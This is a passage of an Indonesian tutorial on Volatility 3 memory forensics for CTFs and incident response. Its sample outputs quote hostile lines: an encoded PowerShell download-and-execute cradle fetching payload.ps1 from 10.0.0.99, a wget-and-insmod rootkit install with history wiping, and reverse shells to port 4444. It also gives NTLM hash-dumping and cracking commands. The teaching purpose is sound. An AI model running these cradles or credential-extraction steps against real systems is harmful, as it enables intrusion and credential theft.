---
id: "58"
title: "🧠 Bagian 0: Fondasi Memory Forensics"
category: "7. Cryptography & Forensics"
categoryId: "crypto_forensics"
filename: "58_memory_forensics_workflow.md"
refs_out: ["05","06","55","57","59"]
refs_in: ["54","55","56","57","59"]
---

> **Target Environment:** Parrot OS XFCE (Debian-based)  
> **Prerequisites:** Memahami dasar Linux CLI, analisis heksadesimal, dan konsep dasar investigasi disk/PCAP (referensi: `[🧭 BAGIAN 0: FONDASI FORENSICS](/docs/forensics)`, `[🏛️ Bagian 0: Fondasi PCAP Analysis](/docs/pcap-analysis)`).  
> **Fokus Utama:** Memory Forensics tingkat lanjut (Windows & Linux) untuk CTF (HackTheBox, TryHackMe, PicoCTF) dan Incident Response tanpa bergantung pada pencarian manual.

---

## 📑 Daftar Isi

1. [Bagian 0: Fondasi Memory Forensics](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-0-fondasi-memory-forensics)
2. [Bagian 1: Triage Awal Memory Dump](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-1-triage-awal-memory-dump)
3. [Bagian 2: Windows Memory Forensics (Deep Dive)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-2-windows-memory-forensics)
4. [Bagian 3: Linux Memory Forensics](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-3-linux-memory-forensics)
5. [Bagian 4: Advanced Analysis Techniques](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-4-advanced-analysis-techniques)
6. [Bagian 5: Plugin Reference Lengkap (Windows & Linux)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-5-plugin-reference-lengkap)
7. [Bagian 6: 10 Common CTF Memory Forensics Patterns](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-6-10-common-ctf-memory-forensics-patterns)
8. [Bagian 7: Decision Tree Memory Forensics](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-7-decision-tree-memory-forensics)
9. [Bagian 8: Automation Script (vol_triage.sh)](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-8-automation-script)
10. [Bagian 9: Troubleshooting & Error Handling](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-9-troubleshooting--error-handling)
11. [Bagian 10: Cheatsheet Copy-Paste Ready](https://arena.ai/c/01a080d6-5139-743e-869a-c0ba705d3785#-bagian-10-cheatsheet-copy-paste-ready)

---

## 🧠 Bagian 0: Fondasi Memory Forensics

### 0.1 Mengapa RAM Krusial?

Jika analisis disk (_dead-box forensics_) diibaratkan memeriksa lemari arsip untuk melihat riwayat file yang tersimpan, maka **analisis memori (RAM) adalah memeriksa meja kerja yang sedang digunakan secara real-time**. Semua yang sedang dipikirkan, dijalankan, dan dimanipulasi oleh sistem operasi berada di RAM.

text

```
       VOLATILE ARTIFACTS IN RAM (Tidak Ada di Disk / Lenyap saat Reboot)
 ┌────────────────────────────────────────────────────────────────────────┐
 │ • In-memory Plaintext Passwords (LSASS, Web Browsers, Keepass)         │
 │ • Fileless Malware & Code Injections (Process Hollowing, DLL Hijacking)│
 │ • Uncommitted Bash History & Terminal Keystrokes                       │
 │ • Active Network Sockets & Ephemeral Connections                       │
 │ • Master Decryption Keys (BitLocker, TrueCrypt, TLS Session Keys)      │
 │ • Clipboard Payload (Data copy-paste yang belum disimpan)              │
 │ • Decoupled / Unlinked Rootkit Processes (DKOM)                        │
 └────────────────────────────────────────────────────────────────────────┘
```

---

### 0.2 Format File Memory Dump

| Format             | Ekstensi               | Generator / Sumber           | Kompatibilitas Volatility 3 | Catatan Forensik                                                               |
| ------------------ | ---------------------- | ---------------------------- | --------------------------- | ------------------------------------------------------------------------------ |
| **Raw / Flat DD**  | `.raw`, `.mem`, `.dmp` | `winpmem`, `LiME`, `dd`      | ✅ Native                    | Salinan bit-by-bit linier dari physical address space. Standar utama CTF.      |
| **Crash Dump**     | `.dmp`                 | Windows BSOD / Memory Dump   | ✅ Native                    | Memiliki header `PAGE_DUMP`. Harus diparsing layer dump-nya.                   |
| **Hibernation**    | `hiberfil.sys`         | Windows Fast Startup / Sleep | ✅ Konversi                  | Terkompresi Xpress/LZX. Dikonversi ke raw via tool `volatility` / `imagecopy`. |
| **VMware**         | `.vmem` (+ `.vmss`)    | VMware Workstation / ESXi    | ✅ Native                    | File memory guest OS. `.vmem` dapat dibaca langsung sebagai raw dump.          |
| **VirtualBox**     | `.sav`, `.elf`         | VirtualBox Snapshot          | ✅ Native/ELF                | Dapat diekstrak via `VBoxManage debugvm dumpvmcore`.                           |
| **Cloud Snapshot** | Snapshots              | AWS EC2 / Azure Snapshot     | ⚠️ Tergantung               | Diubah terlebih dahulu menjadi raw binary volume sebelum dianalisis.           |

---

### 0.3 Volatility 3 vs Volatility 2

|Parameter|Volatility 2 (Legacy)|Volatility 3 (Modern)|
|---|---|---|
|**Runtime Base**|Python 2.7 (Deprecated)|Python 3.x (Aktif)|
|**OS Profiling**|Manual `--profile=Win7SP1x64`|**Auto-detect OS & Kernel via Symbol Tables**|
|**Struktur Perintah**|`vol.py -f mem.raw --profile=... pslist`|`vol -f mem.raw windows.pslist.PsList`|
|**Penyimpanan Simbol**|Hardcoded VTypes di modul Python|**ISF (Intermediate Symbol Format) JSON**|
|**Kecepatan Scanning**|Single-threaded, lambat pada memory besar|Modular caching, multi-threading parsial|

> **Kapan masih butuh Volatility 2?**  
> Hanya ketika menangani image Windows XP/2003 yang sangat lawas, atau menggunakan plugin komunitas lama yang belum di-porting ke Volatility 3 (misal: beberapa plugin malware decryptor kustom).

---

### 0.4 Setup Environment Parrot OS

Jalankan instalasi dan konfigurasi symbol table berikut pada terminal Parrot OS:

Bash

```
# 1. Update sistem dan instal dependencies Python 3
sudo apt update -y
sudo apt install -y python3 python3-pip python3-dev git pcre2-utils libpcre2-dev

# 2. Instal Volatility 3 resmi via pip
sudo pip3 install --upgrade pip
sudo pip3 install volatility3

# 3. Clone repository Volatility 3 untuk mengakses symbols dan utilitas dwarf2json
cd /opt
sudo git clone https://github.com/volatilityfoundation/volatility3.git
sudo git clone https://github.com/volatilityfoundation/dwarf2json.git

# 4. Penanganan Symbol Tables (Auto-Download vs Manual Offline Install)
# Secara default Volatility 3 mengunduh symbol PDB/JSON secara otomatis saat pertama run.

# Langkah Setup Offline Symbol Pack secara Reliabel (Tanpa Bug Wildcard sudo):
VOL_PATH=$(python3 -c "import volatility3, os; print(os.path.dirname(volatility3.__file__))")
echo "[+] Volatility3 path: $VOL_PATH"

# Buat direktori symbols resmi:
sudo mkdir -p "$VOL_PATH/symbols/windows"
sudo mkdir -p "$VOL_PATH/symbols/linux"
sudo mkdir -p "$VOL_PATH/symbols/mac"

# Unduh dan ekstrak Windows Symbols (jika offline environment):
cd /tmp
wget https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip
sudo unzip -q windows.zip -d "$VOL_PATH/symbols/" && rm windows.zip

# Verifikasi symbol terpasang:
ls "$VOL_PATH/symbols/windows/" | head -n 5

# 5. Buat shell aliases & workflow helper di ~/.bashrc
cat << 'EOF' >> ~/.bashrc

# Volatility 3 Base Alias
alias vol='volatility3'

# Quick Triage Helpers (Gunakan bersama: export MEMDUMP="memory.raw")
alias vol-info='volatility3 -f "$MEMDUMP" windows.info'
alias vol-ps='volatility3 -f "$MEMDUMP" windows.pslist'
alias vol-tree='volatility3 -f "$MEMDUMP" windows.pstree'
alias vol-net='volatility3 -f "$MEMDUMP" windows.netscan'
alias vol-cmd='volatility3 -f "$MEMDUMP" windows.cmdline'
alias vol-files='volatility3 -f "$MEMDUMP" windows.filescan'
alias vol-mal='volatility3 -f "$MEMDUMP" windows.malfind'
EOF

source ~/.bashrc

# Workflow Praktis:
# Set target dump sekali: export MEMDUMP="target_memory.raw"
# Lalu panggil perintah cepat: vol-info, vol-ps, vol-net, vol-cmd

# 6. Verifikasi instalasi
vol -h | head -n 15
```

---

## ⚡ Bagian 1: Triage Awal Memory Dump

### 1.1 7 Langkah Triage Terstruktur

text

```
[Memory Dump Diterima]
         │
         ├─► Langkah 1: Identifikasi OS & Arsitektur (windows.info / linux.banner)
         ├─► Langkah 2: Audit Daftar Proses Aktif (windows.pslist)
         ├─► Langkah 3: Validasi Pohon Hierarki Proses (windows.pstree)
         ├─► Langkah 4: Pemetaan Koneksi Jaringan & Sockets (windows.netscan)
         ├─► Langkah 5: Rekonstruksi Baris Perintah (windows.cmdline)
         ├─► Langkah 6: Pemindaian Artefak File Penting (windows.filescan)
         └─► Langkah 7: Deteksi Injeksi Kode Asing (windows.malfind)
```

---

#### Langkah 1: Identifikasi OS dan Versi Kernel

Tentukan arsitektur sistem operasi, versi kernel, dan waktu dump diambil.

Bash

```
vol -f mem.raw windows.info
```

_Contoh Output Nyata:_

text

```
Volatility 3 Framework 2.5.2
Progress:  100.00    PDB scanning finished
Variable    Value

Kernel Base 0xf80002852000
DTB         0x1aa000
Symbols     file:///usr/local/lib/python3.11/dist-packages/volatility3/symbols/windows/ntkrnlmp.pdb/GUID.json
Is64Bit     True
MajorEngineVersion  10
MinorEngineVersion  0
NtMajorVersion      10
NtMinorVersion      0
NtBuildNumber       19041
SystemTime  2023-10-18 14:28:11.000000 
TimeZone    UTC
```

_Interpretasi:_ Image target adalah **Windows 10 x64 (Build 19041)**. Catat `SystemTime` (`2023-10-18 14:28:11 UTC`) sebagai baseline waktu insiden.

---

#### Langkah 2: Daftar Proses Aktif (`windows.pslist`)

Melihat daftar struktur `_EPROCESS` yang terhubung pada doubly-linked list kernel.

Bash

```
vol -f mem.raw windows.pslist
```

_Contoh Output Nyata:_

text

```
PID     PPID    ImageFileName       Offset(V)           Threads Handles SessionId Wow64 CreateTime              ExitTime
4       0       System              0xfa800163a040      96      -       N/A       False 2023-10-18 14:00:01.0   N/A
388     4       smss.exe            0xfa80026f8060      2       29      N/A       False 2023-10-18 14:00:02.0   N/A
524     516     csrss.exe           0xfa80028ab940      9       421     0         False 2023-10-18 14:00:05.0   N/A
600     592     wininit.exe         0xfa80029b3060      3       78      0         False 2023-10-18 14:00:06.0   N/A
672     600     services.exe        0xfa8002a24060      7       210     0         False 2023-10-18 14:00:07.0   N/A
704     600     lsass.exe           0xfa8002a45060      8       540     0         False 2023-10-18 14:00:07.0   N/A
792     672     svchost.exe         0xfa8002b5a060      24      350     0         False 2023-10-18 14:00:08.0   N/A
4920    792     svchost.exe         0xfa8003ef1060      12      180     0         False 2023-10-18 14:15:22.0   N/A
5844    3940    powershell.exe      0xfa800412a060      11      290     1         False 2023-10-18 14:20:45.0   N/A
```

_Interpretasi:_ Amati PID `5844` (`powershell.exe`) yang berjalan di Session 1 (User Session) dengan PPID `3940`. Periksa siapa parent-nya di langkah 3.

---

#### Langkah 3: Pohon Proses (`windows.pstree`)

Memetakan hubungan Parent-Child untuk mengidentifikasi anomali spawn proses.

Bash

```
vol -f mem.raw windows.pstree
```

_Contoh Output Nyata:_

text

```
PID     PPID    ImageFileName       CreateTime              ExitTime
* 4     0       System              2023-10-18 14:00:01.0   N/A
** 388  4       smss.exe            2023-10-18 14:00:02.0   N/A
* 600   592     wininit.exe         2023-10-18 14:00:06.0   N/A
** 672  600     services.exe        2023-10-18 14:00:07.0   N/A
*** 792 672     svchost.exe         2023-10-18 14:00:08.0   N/A
** 704  600     lsass.exe           2023-10-18 14:00:07.0   N/A
* 3940  1420    WINWORD.EXE         2023-10-18 14:18:30.0   N/A
** 5844 3940    powershell.exe      2023-10-18 14:20:45.0   N/A
*** 6112 5844   cmd.exe             2023-10-18 14:21:02.0   N/A
```

_Interpretasi Kritis:_ **ANOMALI BESAR:** `WINWORD.EXE` (PID 3940) memicu spawn `powershell.exe` (PID 5844), yang kemudian menjalankan `cmd.exe` (PID 6112). Ini adalah pola signature eksekusi **Malicious Macro / Phishing Dropper**.

---

#### Langkah 4: Network Connections (`windows.netscan`)

Mendeteksi soket TCP/UDP aktif, koneksi keluar (C2), atau listening port mencurigakan.

Bash

```
vol -f mem.raw windows.netscan
```

_Contoh Output Nyata:_

text

```
Offset          Proto   LocalAddr       LocalPort   ForeignAddr     ForeignPort State       PID     Owner           Created
0xfa8003a11010  TCPv4   192.168.1.105   49210       185.199.108.153 443         ESTABLISHED 3940    WINWORD.EXE     2023-10-18 14:19:01
0xfa8004b28010  TCPv4   192.168.1.105   49300       10.0.0.99       4444        ESTABLISHED 5844    powershell.exe  2023-10-18 14:20:50
0xfa80029c1010  TCPv4   0.0.0.0         135         0.0.0.0         0           LISTENING   792     svchost.exe     2023-10-18 14:00:10
```

_Interpretasi:_ PID `5844` (`powershell.exe`) memiliki koneksi keluar berstatus `ESTABLISHED` ke IP eksternal `10.0.0.99` pada port `4444`. Ini merupakan indikasi **Reverse Shell** aktif.

---

#### Langkah 5: Command History (`windows.cmdline`)

Mengekstrak baris argumen CLI lengkap yang dieksekusi oleh setiap proses.

Bash

```
vol -f mem.raw windows.cmdline
```

_Contoh Output Nyata:_

text

```
PID     Process             Args
3940    WINWORD.EXE         "C:\Program Files\Microsoft Office\Office16\WINWORD.EXE" /n "C:\Users\victim\Downloads\invoice.docm"
5844    powershell.exe      powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA5ADkAOgA4ADAAOAAwAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==
```

_Interpretasi:_ Ditemukan string Base64 UTF-16LE pada parameter `-enc`. Lakukan decoding:

Bash

```
echo "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA5ADkAOgA4ADAAOAAwAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==" | base64 -d | tr -d '\0'
# Hasil: IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.99:8080/payload.ps1')
```

---

#### Langkah 6: Scan File Object (`windows.filescan`)

Mencari cache file pointer yang sempat dimuat ke dalam memori.

Bash

```
vol -f mem.raw windows.filescan | grep -iE "flag|secret|desktop|downloads"
```

_Contoh Output Nyata:_

text

```
0xfa8003f42180  \Users\victim\Desktop\flag.txt
0xfa8004128910  \Users\victim\Downloads\invoice.docm
0xfa800455e230  \Users\victim\AppData\Roaming\Microsoft\Windows\Recent\passwords.docx
```

_Interpretasi:_ Ditemukan file `flag.txt` di memori pada virtual address `0xfa8003f42180`. Gunakan plugin `dumpfiles` untuk mengekstraknya.

---

#### Langkah 7: Deteksi Injeksi Kode (`windows.malfind`)

Memindai area memori VAD yang memiliki permission mencurigakan (`PAGE_EXECUTE_READWRITE`).

Bash

```
vol -f mem.raw windows.malfind
```

_Contoh Output Nyata:_

text

```
PID     Process     ProcessAddress      Protection              CommitCharge    Tag     Output
792     svchost.exe 0x00000000002a0000  PAGE_EXECUTE_READWRITE  3               VadS    
0x00000000002a0000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............
0x00000000002a0010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......
```

_Interpretasi:_ Ditemukan **MZ Header (`4d 5a`)** di dalam memori proses `svchost.exe` (PID 792) pada region `PAGE_EXECUTE_READWRITE`. Ini adalah indikasi pasti **Process Injection / Process Hollowing**.

---

## 🪟 Bagian 2: Windows Memory Forensics

### 2.1 Analisis Proses Mendalam

#### Baseline Proses Normal Windows:

Untuk mendeteksi proses mencurigakan, pahami hierarki normal sistem operasi Windows:

text

```
[System] (PID 4)
   │
   └── smss.exe (Session Manager)
          │
          ├── csrss.exe (Client/Server Runtime)
          ├── wininit.exe (Windows Initialization - Session 0)
          │      ├── services.exe (Service Control Manager)
          │      │      ├── svchost.exe (Multiple instances, -k parameters)
          │      │      └── spoolsv.exe
          │      └── lsass.exe (Local Security Authority)
          │
          └── winlogon.exe (User Logon - Session 1)
                 └── userinit.exe
                        └── explorer.exe (Shell Desktop)
                               └── user apps (chrome.exe, word.exe, etc.)
```

#### Tabel Evaluasi Anomali Proses:

|Nama Proses|Path Normal|Parent Normal|Instance|Akun Pengguna|
|---|---|---|---|---|
|`System`|N/A|None (0)|1|`NT AUTHORITY\SYSTEM`|
|`smss.exe`|`\SystemRoot\System32\`|`System` (4)|1|`NT AUTHORITY\SYSTEM`|
|`csrss.exe`|`\WindowServer\System32\`|`smss.exe`|2+|`NT AUTHORITY\SYSTEM`|
|`wininit.exe`|`\System32\`|`smss.exe`|1|`NT AUTHORITY\SYSTEM`|
|`services.exe`|`\System32\`|`wininit.exe`|1|`NT AUTHORITY\SYSTEM`|
|`lsass.exe`|`\System32\`|`wininit.exe`|1|`NT AUTHORITY\SYSTEM`|
|`svchost.exe`|`\System32\`|`services.exe`|Banyak|`SYSTEM`, `LOCAL/NETWORK SERVICE`|
|`explorer.exe`|`\Windows\`|`userinit.exe` →→ None|1 per user|User Aktif|

_Red Flags Proses:_

1. `lsass.exe` memiliki parent selain `wininit.exe` (atau dieksekusi dari path `\Temp\`).
2. `svchost.exe` dieksekusi tanpa argumen `-k` atau di-spawn oleh `cmd.exe`.
3. Salah ketik nama (_typosquatting_): `scvhost.exe`, `lsas.exe`, `csrs.exe`, `svch0st.exe`.

---

#### C. Deteksi Proses Tersembunyi (`windows.psscan`)

Rootkit kernel menggunakan teknik **DKOM (Direct Kernel Object Manipulation)** untuk memutus (_unlink_) pointer `ActiveProcessLinks` pada struktur `_EPROCESS`. Akibatnya, proses tidak terlihat di Task Manager maupun output `windows.pslist`.

`windows.psscan` melakukan signature carving langsung pada physical memory pool untuk mencari pool tag `Proc` (atau `Pro\xe7`), menemukan struktur `_EPROCESS` meskipun sudah di-unlink.

Bash

```
# Jalankan psscan dan bandingkan dengan pslist
vol -f mem.raw windows.psscan > psscan.txt
vol -f mem.raw windows.pslist > pslist.txt
diff -u <(awk '{print $1,$3}' pslist.txt | sort) <(awk '{print $1,$3}' psscan.txt | sort)
```

Jika ada PID yang muncul di `psscan` tetapi tidak ada di `pslist`, proses tersebut adalah **Hidden Process (Rootkit)**.

---

#### D. Analisis DLL Injection (`windows.dlllist`)

Melihat daftar Dynamic Link Libraries yang dimuat oleh proses tertentu:

Bash

```
# List DLL untuk proses tertentu (misal PID 792)
vol -f mem.raw windows.dlllist --pid 792
```

_Indikator DLL Injection:_

- DLL dimuat dari direktori `\Temp\`, `\Users\Public\`, atau `\AppData\`.
- DLL yang tidak memiliki path file valid di disk (_Reflective DLL Injection_).

---

### 2.2 Analisis File dari Memori

#### A. Identifikasi Pointer File (`windows.filescan`)

Bash

```
vol -f mem.raw windows.filescan | grep -i "\.kdbx\|\.pdf\|\.docx\|\.txt"
```

#### B. Ekstraksi File Biner dari RAM (`windows.dumpfiles`)

Untuk mengekstrak file yang ditemukan pada `filescan`, gunakan parameter virtual address (`--virtaddr`):

Bash

```
# Dump file flag.txt dari virtual address 0xfa8003f42180
mkdir -p dumped_files
vol -f mem.raw -o dumped_files windows.dumpfiles --virtaddr 0xfa8003f42180

# Cek hasil dump
ls -la dumped_files/
file dumped_files/*
cat dumped_files/*.dat
```

---

### 2.3 Registry & Persistence Analysis

Registry Windows dimuat ke dalam RAM dalam struktur blok yang disebut **Hives**.

Bash

```
# 1. Tampilkan hive registry yang termuat di RAM
vol -f mem.raw windows.registry.hivelist

# 2. Periksa Run Keys untuk mendeteksi mekanisme persistensi malware
vol -f mem.raw windows.registry.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"

# 3. Periksa registry Services untuk mencari service mencurigakan
vol -f mem.raw windows.registry.printkey --key "System\CurrentControlSet\Services"
```

---

### 2.4 Credential Extraction

#### A. Dump Hash NTLM (`windows.hashdump`)

Mengekstrak hash password pengguna lokal langsung dari hive `SAM` dan `SYSTEM` yang ada di memori.

Bash

```
vol -f mem.raw windows.hashdump
```

_Contoh Output Nyata:_

text

```
User    rid     lmhash                          nthash
Administrator   500     aad3b435b51404eeaad3b435b51404ee   31d6cfe0d16ae931b73c59d7e0c089c0
Guest           501     aad3b435b51404eeaad3b435b51404ee   31d6cfe0d16ae931b73c59d7e0c089c0
victim          1000    aad3b435b51404eeaad3b435b51404ee   8846f7eaee8fb117ad06bdd830b7586c
```

Cracking hash NTLM menggunakan `hashcat` di Parrot OS:

Bash

```
echo "8846f7eaee8fb117ad06bdd830b7586c" > hash.txt
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

#### B. Ekstraksi LSA Secrets & Hive Security

> ⚠️ **Catatan Penting Volatility 3:** Plugin `windows.lsadump` **TIDAK ADA** secara default di Volatility 3 (plugin ini ada pada Volatility 2 legacy).  
> Untuk mengekstrak LSA secrets & credentials pada Volatility 3, gunakan alternatif berikut:

```bash
# Alternatif 1: Dump Local Credentials Hashes (SAM & SYSTEM)
vol -f mem.raw windows.hashdump

# Alternatif 2: Dapatkan lokasi Hive Registry SAM, SECURITY, SYSTEM via hivelist
vol -f mem.raw windows.registry.hivelist
# Catat virtual address hive SAM, SECURITY, SYSTEM, lalu dump hives

# Alternatif 3: Ekstrak secrets menggunakan secretsdump.py (Impacket) dari hive files:
python3 /opt/impacket/examples/secretsdump.py \
  -sam SAM -security SECURITY -system SYSTEM LOCAL
```

---

### 2.5 Deteksi Malware & Analisis Region Memori

#### Analisis Dump Malfind:

Jika `windows.malfind` mendeteksi region injeksi, lakukan ekstraksi region memori tersebut untuk dianalisis menggunakan pestudio, Ghidra, atau `strings`:

Bash

```
# Dump seluruh region terinjeksi ke folder
mkdir -p malfind_dumps
vol -f mem.raw -o malfind_dumps windows.malfind --dump

# Analisis strings pada file dump
strings -a -e l malfind_dumps/pid.792.*.dmp | head -n 30
```

#### Dump Full Memory Process:

Untuk menganalisis keseluruhan address space dari suatu proses (misal untuk mengekstrak string kredensial dari browser atau malware):

Bash

```
# Dump memori proses PID 5844 secara lengkap
mkdir -p proc_dump
vol -f mem.raw -o proc_dump windows.memmap --dump --pid 5844
strings proc_dump/pid.5844.dmp | grep -iE "password|flag\{|key"
```

---

### 2.6 Ekstraksi Artefak Sesi & Clipboard

> ⚠️ **Catatan Konteks Clipboard:** Plugin `windows.clipboard` bekerja paling baik pada Windows versi lama (XP, 7, 8). Pada Windows 10/11 modern karena arsitektur clipboard berbasis WinRT/multitasking yang kompleks, plugin ini sering mengembalikan output kosong.

```bash
# windows.clipboard -> Handal di Windows XP / 7 / 8
vol -f mem.raw windows.clipboard

# Alternatif jika output kosong pada Windows 10/11:
# Dump memori proses explorer.exe atau rdpclip.exe lalu cari string di heap:
vol -f mem.raw windows.memmap --dump --pid <EXPLORER_PID>
strings -a -e l proc_dumps/pid.<EXPLORER_PID>.dmp | grep -iE "flag\{|CTF\{|picoCTF\{" | head -n 30

# Ekstraksi seluruh environment variables (Mencari API Key / Token / Flags)
vol -f mem.raw windows.envars | grep -iE "flag|secret|token|api"
```

---

## 🐧 Bagian 3: Linux Memory Forensics

Memory forensics pada Linux menggunakan Volatility 3 memerlukan **Symbol Table JSON** yang cocok secara presisi dengan arsitektur dan versi kernel Linux pada image dump.

### 3.1 Tabel Lengkap Plugin Linux Volatility 3

|Plugin|Sintaks Perintah|Fungsi Operasional|
|---|---|---|
|`linux.pslist`|`vol -f mem.raw linux.pslist`|Menampilkan seluruh proses aktif dari `task_struct`.|
|`linux.pstree`|`vol -f mem.raw linux.pstree`|Menampilkan pohon hierarki proses Linux.|
|`linux.bash`|`vol -f mem.raw linux.bash`|**Mengekstrak riwayat perintah bash dari heap memory.**|
|`linux.netstat`|`vol -f mem.raw linux.netstat`|Menampilkan soket jaringan aktif, listening port, dan koneksi TCP/UDP.|
|`linux.lsof`|`vol -f mem.raw linux.lsof`|Menampilkan file descriptor terbuka untuk setiap proses.|
|`linux.check_creds`|`vol -f mem.raw linux.check_creds`|Memeriksa anomali credential proses (deteksi privilege escalation).|
|`linux.check_modules`|`vol -f mem.raw linux.check_modules`|Mendeteksi rootkit kernel loadable module (LKM) yang tersembunyi.|
|`linux.lsmod`|`vol -f mem.raw linux.lsmod`|Menampilkan daftar modul kernel yang sedang termuat.|
|`linux.malfind`|`vol -f mem.raw linux.malfind`|Menemukan region memori proses dengan flag execute-writeable (VMA).|
|`linux.elfs`|`vol -f mem.raw linux.elfs`|Memindai dan mengekstrak file executable ELF dari memori proses.|
|`linux.proc_maps`|`vol -f mem.raw linux.proc_maps`|Menampilkan rincian memory mapping (`/proc/$PID/maps`) per proses.|
|`linux.mountinfo`|`vol -f mem.raw linux.mountinfo`|Menampilkan sistem file yang dimount pada saat capture.|
|`linux.keyboard_notifiers`|`vol -f mem.raw linux.keyboard_notifiers`|Mendeteksi fungsi keylogger yang terpasang pada call chain kernel.|
|`linux.sockstat`|`vol -f mem.raw linux.sockstat`|Ringkasan statistik soket kernel level.|
|`linux.capabilities`|`vol -f mem.raw linux.capabilities`|Memeriksa Linux POSIX capabilities yang dimiliki proses.|

---

#### Baseline Proses & Anomali Linux:

|Proses Normal|PID Expected|Parent Normal|Path / Executable Normal|Catatan Anomali|
|---|---|---|---|---|
|`systemd` / `init`|1|0|`/sbin/init` atau `/lib/systemd/systemd`|Harus PID 1|
|`kthreadd`|2|0|Kernel thread `[kthreadd]`|Parent untuk semua kernel threads|
|`[kworker/...]`|Varies|2|Kernel space `[kworker/u:X]`|Jika TANPA tanda kurung siku `[]`, itu proses malware biasa!|
|`sshd`|Varies|`systemd`|`/usr/sbin/sshd`|Spawn shell saat user login via SSH|
|`bash` / `sh`|Varies|`sshd` atau Terminal|`/bin/bash` atau `/usr/bin/zsh`|Jika spawn di bawah `www-data` (`apache2`/`nginx`), ini **Webshell / Reverse Shell**!|

*Red Flags Linux:*
1. Nama kernel thread seperti `kworker` atau `kthreadd` yang berjalan di User Space tanpa tanda kurung `[]`.
2. Proses `bash` atau `sh` yang berjalan dengan UID 0 (root) padahal di-spawn oleh web server `www-data`.
3. Executable yang dieksekusi dari `/tmp`, `/var/tmp`, atau `/dev/shm`.

---

### 3.2 Pembuatan Symbol Table Linux (Dwarf2json)

Jika Volatility 3 menampilkan error: `No suitable kernel symbols found`, Anda harus membuat symbol table JSON menggunakan kernel debug package (`vmlinux`) dan `System.map` yang sesuai dengan kernel target.

#### Prosedur Pembuatan Symbols:

Bash

```
# 1. Identifikasi versi kernel target dari memory dump menggunakan strings
strings mem.raw | grep -E "Linux version [0-9]+\.[0-9]+" | head -n 1
# Contoh output: Linux version 5.10.0-8-amd64 (debian-kernel@lists.debian.org)

# 2. Kompilasi tool dwarf2json (jika belum ada)
cd /opt/dwarf2json
sudo go build

# 3. Di sistem yang memiliki versi kernel sama (atau unduh paket linux-image-*-dbg):
# sudo apt install linux-image-5.10.0-8-amd64-dbg
./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-5.10.0-8-amd64 \
                   --system-map /boot/System.map-5.10.0-8-amd64 > linux-5.10.0-8-amd64.json

# 4. Pindahkan file JSON ke direktori simbol Volatility 3
sudo cp linux-5.10.0-8-amd64.json /usr/local/lib/python3.*/dist-packages/volatility3/symbols/linux/
```

---

### 3.3 Ekstraksi Artefak Spesifik Linux

#### A. Ekstraksi Bash History dari RAM (`linux.bash`)

Plugin `linux.bash` memindai heap memori dari proses `bash` untuk mengambil command line history, termasuk perintah yang belum ditulis ke `.bash_history` atau yang sengaja dihapus oleh attacker via `unset HISTFILE` atau `history -c`.

Bash

```
vol -f mem.raw linux.bash
```

_Contoh Output Nyata:_

text

```
PID     Process CommandTime             Command
1820    bash    2023-10-18 15:10:02     cd /tmp
1820    bash    2023-10-18 15:10:14     wget http://10.0.0.99/rootkit.ko
1820    bash    2023-10-18 15:10:20     insmod rootkit.ko
1820    bash    2023-10-18 15:11:05     echo "flag{b4sh_h1st0ry_1n_r4m_n3v3r_l13s}" > /root/flag.txt
1820    bash    2023-10-18 15:11:45     history -c && unset HISTFILE
```

#### B. Contoh Output & Analisis `linux.pslist` & `linux.netstat`

```bash
# 1. Menampilkan daftar proses Linux
vol -f mem.raw linux.pslist
```

_Contoh Output `linux.pslist`:_

```text
PID     PPID    COMM            OFFSET              UID     GID     CREATED
1       0       systemd         0xffff88007c018000  0       0       2023-10-18 15:00:00
2       0       kthreadd        0xffff88007c019000  0       0       2023-10-18 15:00:00
1420    1       sshd            0xffff88007a120000  0       0       2023-10-18 15:05:12
1820    1420    bash            0xffff88007b340000  1000    1000    2023-10-18 15:08:44
2105    1820    nc              0xffff88007c890000  1000    1000    2023-10-18 15:10:05
```

```bash
# 2. Menampilkan soket jaringan aktif Linux
vol -f mem.raw linux.netstat
```

_Contoh Output `linux.netstat`:_

```text
State       Recv-Q  Send-Q  Local Address           Foreign Address         PID/Process
ESTABLISHED 0       0       192.168.1.105:41204     10.0.0.99:4444          2105/nc
LISTEN      0       0       0.0.0.0:22              0.0.0.0:*               1420/sshd
```

_Interpretasi:_ PID `2105` (`nc` / netcat) memiliki koneksi aktif `ESTABLISHED` ke IP `10.0.0.99:4444` (Reverse Shell).

#### C. Deteksi Rootkit Kernel (`linux.check_modules`)

Rootkit LKM (Loadable Kernel Module) tersembunyi menyembunyikan dirinya dari daftar `/proc/modules` (sehingga tidak terlihat di `linux.lsmod`). Plugin `linux.check_modules` membandingkan modul di memori kernel dengan list resmi `modules`.

```bash
vol -f mem.raw linux.check_modules
```

